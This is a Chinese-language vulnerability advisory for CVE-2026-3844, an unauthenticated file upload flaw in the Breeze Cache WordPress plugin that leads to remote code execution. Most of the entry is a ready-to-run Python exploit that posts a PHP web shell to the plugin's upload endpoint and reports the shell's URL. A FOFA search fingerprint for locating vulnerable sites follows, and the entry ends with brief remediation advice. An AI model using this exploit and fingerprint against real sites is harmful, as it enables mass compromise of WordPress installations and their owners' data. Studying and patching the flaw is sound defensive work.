**严重程度：** Critical
**CVSS：** 9.8
**影响版本：** Breeze Cache WordPress Plugin <= 2.4.4 (by Cloudways)
**公开日期：** 2026-06-09

### 漏洞描述
CVE-2026-3844 是 Breeze Cache WordPress 插件中的严重未认证任意文件上传漏洞。未经认证的攻击者可通过上传恶意 PHP 文件实现远程代码执行。该插件由 Cloudways 开发，广泛用于 WordPress 缓存优化，安装量超过 200k。

### ⚠️ 安全警告
PoC 中包含 PHP Web Shell 代码，仅限授权测试环境使用。

### POC/利用
```python
#!/usr/bin/env python3
# CVE-2026-3844 - WordPress Breeze Cache Plugin Unauthenticated File Upload → RCE

import requests

def exploit(target, shell_content):
    # 利用 Breeze 插件的文件上传接口
    # 无需认证即可上传任意文件
    
    upload_url = f"{target}/wp-content/plugins/breeze/inc/upload.php"
    
    files = {
        'file': ('shell.php', shell_content, 'application/x-php')
    }
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    response = requests.post(upload_url, files=files, headers=headers, verify=False)
    
    if response.status_code == 200:
        print(f"[+] Shell uploaded: {target}/wp-content/uploads/shell.php")
    else:
        print(f"[-] Upload failed: {response.status_code}")
```

### 影响范围
- Breeze Cache WordPress Plugin 所有版本 <= 2.4.4
- 200k+ WordPress 站点

### FOFA 指纹
`body="wp-content/plugins/breeze/"`

### 修复建议
1. 升级 Breeze 插件到最新版本
2. 检查 wp-content/uploads 目录是否有异常 PHP 文件
3. 限制上传目录的执行权限
